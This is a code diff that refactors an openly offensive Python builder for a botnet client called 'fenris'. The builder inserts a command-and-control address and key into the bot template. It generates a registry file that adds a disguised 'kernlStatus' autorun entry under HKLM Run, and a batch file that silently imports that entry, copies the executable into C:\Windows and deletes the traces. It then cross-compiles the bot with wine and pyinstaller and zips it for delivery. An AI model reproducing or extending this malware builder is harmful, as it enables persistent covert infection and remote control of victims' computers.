@@ -36,6 +36,44 @@ def ctrlc_handler(self, frm):
         print "*** Remember: \"A hacker should only be limited by his imagination and not by his tools.\"\n"
         sys.exit(0)
 
+def update_fenris(candc, key):
+	f = open("fenrisTemplate.py", "r")
+	newFileContent = ""
+	for line in f.readlines():
+		if "[DUMMYCANDC]" in line:
+			line = "candc = \"" + candc + "\"\n"
+		if "[DUMMYKEY]" in line:
+			line = "key = \"" + key + "\"\n"
+		newFileContent += line
+	f.close()
+	f = open("fenris.py", "w")
+	f.write(newFileContent)
+	f.close()
+
+def createExeAndStuff(execName, venvPath, pyPath):
+	# create registry key
+	botRegFilename = str(randint(0, 5000)) + ".reg"
+	botRegPayload = "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"kernlStatus\"=\"C:\\\\Windows\\\\" + execName + ".exe\""
+	botReg = open(botRegFilename, "w")
+	botReg.write(botRegPayload)
+	botReg.close()		
+	
+	# create batch file
+	batContent = "start\r\nregedit /s " + botRegFilename + "\r\ncopy \"" + execName + ".exe\" \"C:\\Windows\\" + execName + ".exe\"\r\ndel \"" + execName + ".exe\"\r\ndel \"" + botRegFilename + "\"\r\nexit"
+	batFile = open(execName + ".bat", "w")
+	batFile.write(batContent)
+	batFile.close()	
+	
+	# cross compile...
+	os.system(". " + venvPath + "/bin/activate; wine c:/Python27/python.exe " + pyPath + " -w -a -F fenris.py")
+	
+	# make zip
+	os.system("cp dist/fenris.exe " + execName + ".exe")
+	os.system("zip " + execName + ".zip " + execName + ".bat " + botRegFilename + " " + execName + ".exe")
+	os.system("rm " + execName + ".bat")
+	os.system("rm " + execName + ".exe")
+	os.system("rm " + botRegFilename)	
+
 if len(sys.argv) < 2:
 	sys.exit(usageString + "\n-h: help menu")
 else:
@@ -69,42 +107,8 @@ else:
 		venvPath = configContent[0]
 		pyPath = configContent[1]
 
-		# update fenris.py
-                f = open("fenrisTemplate.py", "r")
-                newFileContent = ""
-                for line in f.readlines():
-                        if "[DUMMYCANDC]" in line:
-                                line = "candc = \"" + candc + "\"\n"
-                        if "[DUMMYKEY]" in line:
-                                line = "key = \"" + key + "\"\n"
-                        newFileContent += line
-                f.close()
-                f = open("fenris.py", "w")
-                f.write(newFileContent)
-                f.close()
-
-		# create registry key and add it
-                botRegFilename = str(randint(0, 5000)) + ".reg"
-		botRegPayload = "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"kernlStatus\"=\"C:\\\\Windows\\\\" + execName + ".exe\""
-		botReg = open(botRegFilename, "w")
-		botReg.write(botRegPayload)
-		botReg.close()		
-		
-		# create batch file
-		batContent = "start\r\nregedit /s " + botRegFilename + "\r\ncopy \"" + execName + ".exe\" \"C:\\Windows\\" + execName + ".exe\"\r\ndel \"" + execName + ".exe\"\r\ndel \"" + botRegFilename + "\"\r\nexit"
-		batFile = open(execName + ".bat", "w")
-		batFile.write(batContent)
-		batFile.close()
-		
-		# cross compile...
-                os.system(". " + venvPath + "/bin/activate; wine c:/Python27/python.exe " + pyPath + " -w -a -F fenris.py")
-
-		# make zip
-                os.system("cp dist/fenris.exe " + execName + ".exe")
-                os.system("zip " + execName + ".zip " + execName + ".bat " + botRegFilename + " " + execName + ".exe")
-                os.system("rm " + execName + ".bat")
-                os.system("rm " + execName + ".exe")
-                os.system("rm " + botRegFilename)
+		update_fenris(candc, key)
+		createExeAndStuff(execName, venvPath, pyPath)
 
 		sys.exit()
 
@@ -122,44 +126,11 @@ else:
 		if randKeyOrNpt != "y" and randKeyOrNpt != "n" and randKeyOrNpt != "s":
 			print myTool.fail + "[-]" + myTool.stop + "Wrong input! (choose one of: y, n, s)"
 			sys.exit(0)
-		# update fenris.py
-		f = open("fenrisTemplate.py", "r")
-		newFileContent = ""
-		for line in f.readlines():
-			if "[DUMMYCANDC]" in line:
-				line = "candc = \"" + candc + "\"\n"
-			if "[DUMMYKEY]" in line:
-				line = "key = \"" + key + "\"\n"
-			newFileContent += line
-		f.close()
-		f = open("fenris.py", "w")
-		f.write(newFileContent)
-		f.close()
-		
-		# create registry key and add it
-		botRegFilename = str(randint(0, 5000)) + ".reg"
-		botRegPayload = "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"kernlStatus\"=\"C:\\\\Windows\\\\" + execName + ".exe\""
-		botReg = open(botRegFilename, "w")
-		botReg.write(botRegPayload)
-		botReg.close()		
-		
-		# create batch file
-		batContent = "start\r\nregedit /s " + botRegFilename + "\r\ncopy \"" + execName + ".exe\" \"C:\\Windows\\" + execName + ".exe\"\r\ndel \"" + execName + ".exe\"\r\ndel \"" + botRegFilename + "\"\r\nexit"
-		batFile = open(execName + ".bat", "w")
-		batFile.write(batContent)
-		batFile.close()
-		
-		# cross compile...
 		virtualEnvWine = raw_input("# Virtual wine environment root-path: ")
-		pyinstaller = raw_input("# pyinstaller.py root-path: ")
-		os.system(". " + virtualEnvWine + "/bin/activate; wine c:/Python27/python.exe " + pyinstaller + " -w -a -F fenris.py")
+		pyinstaller = raw_input("# pyinstaller.py root-path: ")		
 		
-		# make zip
-		os.system("cp dist/fenris.exe " + execName + ".exe")
-		os.system("zip " + execName + ".zip " + execName + ".bat " + botRegFilename + " " + execName + ".exe")
-		os.system("rm " + execName + ".bat")
-		os.system("rm " + execName + ".exe")
-		os.system("rm " + botRegFilename)
+		update_fenris(candc, key)
+		createExeAndStuff(execName, virtualEnvWine, pyinstaller)
 		
 		print myTool.green + "[+]" + myTool.stop + " " + execName + ".zip saved (execute the .bat file to install the bot)."
 		print myTool.green + "[+]" + myTool.stop + " The encryption key for the bot is: " + key
